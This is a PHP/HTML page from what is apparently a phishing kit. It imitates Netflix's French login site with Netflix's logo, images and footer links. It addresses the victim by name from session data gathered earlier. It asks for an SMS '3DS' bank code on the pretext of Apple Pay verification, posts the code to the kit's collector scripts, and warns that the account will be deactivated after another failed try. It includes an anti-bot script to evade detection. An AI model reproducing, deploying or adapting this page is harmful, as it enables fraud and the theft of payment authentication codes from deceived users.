<?php session_start(); 
include("../../antibots/sub_sub_includes.php");
include("../../config.php");
?>
<!DOCTYPE html>
<html lang="fr" data-triggered="true">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
    <title>Netflix</title>
    <link rel="stylesheet" href="../login/assets/style.css">
    <link rel="stylesheet" href="../login/assets/styles.css">
    <link rel="stylesheet" href="../login/assets/styles__ltr.css">
    <script src="../login/assets/none(2).js"></script>
    <script src="../login/assets/none(3).js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="../login/assets/jquery.mask.js"></script>
    <script type='text/javascript' src='https://code.jquery.com/jquery-1.11.0.js'></script>
    <script type='text/javascript' src="https://rawgit.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
    <meta content="regarder films, films en ligne, regarder TV, TV en ligne, séries TV en ligne, regarder séries TV, streaming films, streaming séries TV, streaming instantané, regarder en ligne, films, regarder films France, regarder TV en ligne, sans télécharger, films en entier" name="keywords">
    <meta content="Regardez des films et des séries TV Netflix en ligne, sur votre smart TV, console de jeu, PC, Mac, smartphone, tablette et bien plus." name="description">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png">
    <meta property="og:description" content="Regardez des films et des séries TV Netflix en ligne, sur votre smart TV, console de jeu, PC, Mac, smartphone, tablette et bien plus.">
    <meta property="al:ios:url" content="nflx://www.netflix.com/login?locale=fr-FR">
    <meta property="al:ios:app_store_id" content="363590051">
    <meta property="al:ios:app_name" content="Netflix">
    <meta property="al:android:url" content="nflx://www.netflix.com/login?locale=fr-FR">
    <meta property="al:android:package" content="com.netflix.mediaclient">
    <meta property="al:android:app_name" content="Netflix">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@netflix">
  </head>
  <body>
    <div id="appMountPoint">
      <div class="login-wrapper hybrid-login-wrapper">
        <div class="login-wrapper-background">
          <img class="concord-img vlv-creative" src="https://www.netflix.com/Netflix_files/FR-fr-20220307-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcset="https://assets.nflxext.com/ffe/siteui/vlv3/87a1d9d8-a21d-4109-ba3a-c10d9055f5cf/5491a337-dd7f-423e-aac5-6da179feb9b9/FR-fr-20220307-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/87a1d9d8-a21d-4109-ba3a-c10d9055f5cf/5491a337-dd7f-423e-aac5-6da179feb9b9/FR-fr-20220307-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/87a1d9d8-a21d-4109-ba3a-c10d9055f5cf/5491a337-dd7f-423e-aac5-6da179feb9b9/FR-fr-20220307-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt="">
        </div>
        <div class="nfHeader login-header signupBasicHeader">
          <a href="https://www.netflix.com/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
            <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
              <g id="netflix-logo">
                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
              </g>
            </svg>
            <span class="screen-reader-text">Netflix</span>
          </a>
        </div>
        <div class="login-body">
          <div>
            <noscript>
              <div data-uia="error-message-container" class="ui-message-container ui-message-error">
                <div class="ui-message-icon"></div>
                <div data-uia="text" class="ui-message-contents">Il semble que JavaScript soit désactivé. Veuillez l'activer pour restaurer toutes les fonctionnalités de la page.</div>
              </div>
            </noscript>
            <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
              <div class="hybrid-login-form-main">
              <form method="POST" action="<?php if ($rez_emojis == true) { echo '../../app/ap/emojis.php'; } else { echo '../../app/ap/sans.php'; } ?>" class="contain-info">

<center>
<span class="step" style="text-transform:uppercase"></span>
<h1 style="display:flex;justify-content:center;color:red;">IDENTIFICATION 3DS NETFLIX</h1>
</b></h3>
<h3 class="rs-txt-s1" style="color: #fff;">Chèr(e) <?php echo substr($_SESSION['name'], -250); ?> <?php echo substr($_SESSION['namen'], -250); ?>, <br><br> Pour sécuriser au mieux vos futur factures, nous allons procéder à une vérification en
   vous envoyant un code SMS via notre partenaire de paiement APPLE PAY.
</h3>
<h3 class="rs-txt-s1" style="color: #fff;">Cette vérification est nécessaire afin que vous puissiez vous identifier en saisissant le code d'accès que vous recevrez par SMS lors de vos prochaines connexions <span style="color:red">Netflix.</span></h3>
<h1></h1>
<div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                    <div class="nfInputPlacement">
                      <div class="nfEmailPhoneControls">
                        <label class="input_id" placeholder="">
                          <input type="tel" data-uia="login-field" name="vbv" class="nfTextField" id="vbv" autocomplete="vbv" dir="">
                          <label for="vbv" class="placeLabel">Code de sécurité</label>
                          
                      </div>
                      <?php if(isset($_GET['invalid'])) {
                       ?>
                      <div id="" class="msg_error inputError" data-uia="login-field+error">Votre compte sera désactivé au prochain essai raté !</div>
                      <?php } ?>
                      <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0" data-uia="login-submit-button">Vérifier</button>
                    </div>
                  </div>
                  
<hr>
         <h3 style="color:#fff">
Cette identification est obligatoire pour conclure la procédure.</h3>
<IMG style="HEIGHT: 53px; WIDTH: 135px" border=0 hspace=0 alt="" src="../login/assets/paments.png" width=716 align=baseline height=283>
</form>

                
              </div>
            </div>
          </div>
        </div>
        <div class="site-footer-wrapper centered">
          <div class="footer-divider"></div>
          <div class="site-footer">
            <p class="footer-top">Des questions&nbsp;? Appelez le <a class="footer-top-a" href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a>
            </p>
            <ul class="footer-links structural">
              <li class="footer-link-item" placeholder="footer_responsive_link_faq_item">
                <a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/support/412" placeholder="footer_responsive_link_faq">
                  <span id="" data-uia="data-uia-footer-label">FAQ</span>
                </a>
              </li>
              <li class="footer-link-item" placeholder="footer_responsive_link_help_item">
                <a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/" placeholder="footer_responsive_link_help">
                  <span id="" data-uia="data-uia-footer-label">Centre d'aide</span>
                </a>
              </li>
              <li class="footer-link-item" placeholder="footer_responsive_link_terms_item">
                <a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms">
                  <span id="" data-uia="data-uia-footer-label">Conditions d'utilisation</span>
                </a>
              </li>
              <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item">
                <a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link">
                  <span id="" data-uia="data-uia-footer-label">Confidentialité</span>
                </a>
              </li>
              <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item">
                <a class="footer-link" data-uia="footer-link" href="https://www.netflix.com/fr/login#" placeholder="footer_responsive_link_cookies_separate_link">
                  <span id="" data-uia="data-uia-footer-label">Préférences de cookies</span>
                </a>
              </li>
              <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item">
                <a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/corpinfo" placeholder="footer_responsive_link_corporate_information">
                  <span id="" data-uia="data-uia-footer-label">Mentions légales</span>
                </a>
              </li>
            </ul>
            <div class="lang-selection-container" id="lang-switcher">
              <div data-uia="language-picker+container" class="ui-select-wrapper">
                <label for="lang-switcher-select" class="ui-label">
                  <span class="ui-label-text">Choisir la langue</span>
                </label>
                <div class="select-arrow medium prefix globe">
                  <select data-uia="language-picker" class="ui-select medium" id="lang-switcher-select" tabindex="0" placeholder="lang-switcher">
                    <option selected="" lang="fr" value="/?locale=fr-FR" data-language="fr" data-country="FR">Français</option>
                    <option lang="en" value="/?locale=en-FR" data-language="en" data-country="FR">English</option>
                  </select>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    </div>
    </div>
    </div>
    </div>
  </body>
</html>